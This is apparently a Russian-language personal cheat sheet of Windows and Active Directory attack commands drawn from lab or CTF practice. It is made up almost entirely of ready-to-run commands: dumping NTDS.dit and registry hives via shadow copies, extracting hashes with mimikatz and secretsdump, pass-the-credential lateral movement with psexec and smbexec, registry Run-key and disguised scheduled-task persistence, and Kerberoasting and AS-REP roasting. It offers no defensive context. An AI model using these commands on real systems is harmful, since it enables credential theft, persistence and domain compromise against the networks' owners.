# Up_windows







Создание теневой копии диска

vssadmin create shadow /for=c:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy




Поиск секретов


cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config

Как извлечь хеш пароля пользователя NTLM из файлов реестра



.\mimikatz.exe
lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM

impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL >> text распарсить файл ntds.dit




Psexec -i \\192.168.50.200 -u administrator -s cmd.exe Привелигерованный режим... (если уже админ то ситем)
для psexec
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f




Автозагрузка.....
Если у вас права обычного пользователя, следует использовать ветку реестра HKCU

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
 
reg add "HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"



Если у вас есть админские права в системе, следует использовать ветку HKLM — в таком случае каждый раз при запуске системы будет выполняться payload.exe или dll. Этот способ хорош тем, что не зависит от пользователя, который логинится в систему.

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v payload /t REG_SZ /d "C:\tmp\payload.dll"
 
reg add “HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run” /v payload /t REG_SZ /d “C:\tmp\payload.exe”


Пример создания запланированной задачи:

schtasks /create /sc minute /mo 5 /tn "Opera scheduled Autoupdate 1594994248" /tr C:\tmp\Opera_autoupdate1594994248.exe

at 13:01 /interactive cmd запуск с правами администратора!!!

chcp 65001

psexec -i \\\adress -u user cmd

python smbexec.py ignite/administrator:Ignite@987@192.168.1.105

***************************************************************************************************************************************************
Cбор информации в домене 


net user /domain пользователи домена
Get-ADUser -identity administrator -properties *
Get-ADUser -identity administrator -properties memberof

net user administrator /domain в какие группы входит пользователь
net group "domain admins" кто входит в группы

Get-ADcomputer -filter * -properties * | ft nmae, ipv4adress компутеры в домене
net group "domain computer"

снаружи домена 
rpcclient 10.10.38.153 -U nik - нужен пароль - может перечислять пользователей и группы в домене 
enumdomusers - перчисляет пользователей 
enumdomgroup - перечисляет группы

Поиск SPN_учетных записей без пароля
python3 GetNPUsers.py enterprise.thm/ -dc-ip 10.10.38.153 -usersfile /home/max/users.txt -no-pass

Глянуть SPN 

python3 GetUserSPNs.py -dc-ip 10.10.154.84 lab.enterprise.thm/nik:ToastyBoi! -request

   Скрипты векторов повышения привелегий

cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config

Systeminfo - отображает подробную информацию о конфигурации компьютера и его операционной системы, включая конфигурацию операционной системы, информацию о безопасности, идентификатор продукта и свойства оборудования (например, ОЗУ, место на диске и сетевые карты).
Systeminfo перенаправил в текстовик, после этого я загрузил на Kali этот файл, и сейчас будем смотреть в него

Но перед этим нужно скачать exploit_suggester, например такой: GitHub - AonCyberLabs/Windows-Exploit-Suggester: This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.

https://github.com/HarmJ0y/PowerUp

https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
  для которого import-module ./powerup.ps1 и затем Invoke-AllChecks

  
